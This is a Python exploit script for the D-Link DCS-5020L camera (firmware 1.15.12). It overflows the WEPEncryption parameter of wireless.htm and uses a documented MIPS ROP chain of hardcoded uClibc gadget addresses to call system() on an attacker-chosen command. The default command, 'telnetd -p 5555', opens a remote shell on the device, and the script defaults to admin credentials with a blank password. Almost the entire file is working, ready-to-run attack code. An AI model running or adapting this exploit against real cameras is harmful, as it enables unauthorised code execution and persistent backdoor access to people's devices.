import urllib
import argparse
import requests
from requests.auth import HTTPDigestAuth
from requests.auth import HTTPBasicAuth

# Exploit a vulnerability in the DCS-5020L ver 1.15.12
# Vulnerability is requesting wireless.htm with a large string in the 
# WEPEncryption variable.
#
# ROP Gadgest used for arbitrary code execution
# ---------------------------------------------------------------------
#    Base of uclibc -> 0x2AB86000
#    Offset of system in uclibc -> 0x45080 
#
#    ----------------------------------------------------------------
#    | Gadget Name | Gadget Offset | Gadget Summary                 |
#    ----------------------------------------------------------------
#    | ROP1        | 0x0004B0F8    | move    $t9, $s0               |
#    |             |               | jalr    $t9 ; sub_4A890        |
#    |             |               | addiu   $s2, $sp, 0x1E8+var_F8 |
#    ----------------------------------------------------------------
#    | ROP2        | 0x00018F40    | move    $t9, $s1               |
#    |             |               | jalr    $t9 ; sub_18EB0        |
#    |             |               | move    $a0, $s2               |
#    ----------------------------------------------------------------
#
#    System -> 0x2AB86000 + 0x45080 = 0x2ABCB080
#    ROP1   -> 0x2AB86000 + 0x4B0F8 = 0x2ABD10F8  
#    ROP2   -> 0x2AB86000 + 0x18F40 = 0x2AB9EF40

# If these bytes are encoded they will kill any attempt to authenticate with 
# the server.
invalid_encode_characters = {'%2F': '/', 
                             '%5F': '_', 
                             '%2E': '.', 
                             '%2D': '-', 
                             '%3F': '?', 
                             '%26': '&', 
                             '%3d': '=', 
                             '%7E': '~', 
                             '%40': '@', 
                             '%23': '#',
                             '%24': '$',
                             '%25': '%',
                             '%5E': '^',
                             '%3A': ':'}


def url_encode(url, params):
    """
    Perform special url encoding that fixes up the invalid encode characters.

    :param url: Url to append encoded params to. 
    :type url: str

    :param params: Parameters that will be custom urlencoded 
    :type params: dict

    :return: Encoded url with parameters.
    :rtype: str
    """
    encoded_params = urllib.urlencode(params)
    for bad_encoding in invalid_encode_characters.keys():
        if bad_encoding in encoded_params:
            encoded_params = encoded_params.replace(
                    bad_encoding, invalid_encode_characters[bad_encoding])

    return url + '?' + encoded_params


def exploit_target(target_ip, target_port, command, digest, basic, username, 
                   password):
    """
    Perform target exploitation.

    :param target_ip: IP address of the target.
    :type target_ip: str

    :param target_port: Listening port of alphapd.
    :type target_port: str

    :param command: Command to execute on the target after exploitation is 
                    complete.
    :type command: str

    :param digest: Perform digest authentication.
    :type digest: bool
    
    :param basic: Perform HTTP basic authentication.
    :type basic: bool

    :param username: Username for HTTP authentication.
    :type username: str

    :param password: Password for HTTP authentication.
    :type password: str
    """
    if (digest and basic) or (not digest and not basic):
        raise Exception('Either digest or basic authentication must be given, \
                         but not both.')

    if username is None or password is None:
        raise Exception('Username and password is required for exploitation.')

    overflow_char = 'A' 

    # Length from the overflowed buffer to the $s0 register on the stack.
    length_to_s0 = 0x10

    s0 = '\x40\xEF\xB9\x2A'
    s1 = '\x80\xB0\xBC\x2A'
    s2 = 'AAAA'
    s3 = 'AAAA'
    s4 = 'AAAA'
    s5 = 'AAAA'
    ra = '\xF8\x10\xBD\x2A'
    pad = 'AAAA'
    # Because $ra is at -8, 4 bytes of padding are needed so
    # we are at the stack when we write next.

    # Padding to command on the stack of the ROP gadget.
    stack_rop_padding = 0x1E8 - 0xF8

    overflow = overflow_char * length_to_s0 + \
               s0 + \
               s1 + \
               s2 + \
               s3 + \
               s4 + \
               s5 + \
               ra + \
               pad + \
               'B' * stack_rop_padding + \
               command.replace(' ', '${IFS}')

    # Must have a value in the referer field of the HTTP header or a request
    # Forbidden is returned. Doesn't seem to like if port 80 is in the referer 
    # field so handle it differently here.
    if target_port == '80':
        url = 'http://%s/wireless.htm' % target_ip
        referer = 'http://%s/wizard.htm' % target_ip
    else:
        url = 'http://%s:%s/wireless.htm' % (target_ip, target_port)
        referer = 'http://%s:%s/wizard.htm' % (target_ip, target_port)

    print 'Sending exploit to %s' % url
    print 'Adding referer header: %s' % referer
    print 'Command to be executed: %s' % command

    params = {'WEPEncryption': overflow}
    url = url_encode(url, params)

    print 'Full url: %s' % url
    print 'Referer: %s' % referer
    if basic:
        print 'Performing HTTP basic authentication.'
        auth = HTTPBasicAuth(username, password)
    else:
        print 'Performing HTTP digest authentication.'
        auth = HTTPDigestAuth(username, password)

    try:
        r = requests.get(url, auth=auth, headers={'Referer': referer})
        print 'Failed to exploit the target. Return value: %s' % r
    except:
        print 'Exploit successful.'


if __name__ == '__main__':
    parser = argparse.ArgumentParser()

    parser.add_argument('-i', '--ip', help='Target IP address.')
    parser.add_argument('-P', '--port', help='Target Port.', default='80')
    parser.add_argument('-c', '--command', default='telnetd -p 5555',
                        help='Command to execute after exploitation.')
    parser.add_argument('-u', '--user', help='Username for authentication', 
                        default='admin')
    parser.add_argument('-p', '--password', help='Password for authentication.',
                        default='')
    parser.add_argument('-d', '--digest', help='HTTP digest authentication.', 
                        default=False, action='store_true')
    parser.add_argument('-b', '--basic', help='HTTP basic authentication.', 
                        default=False, action='store_true')

    args = parser.parse_args()

    exploit_target(args.ip, args.port, args.command, args.digest, args.basic, 
                   args.user, args.password)

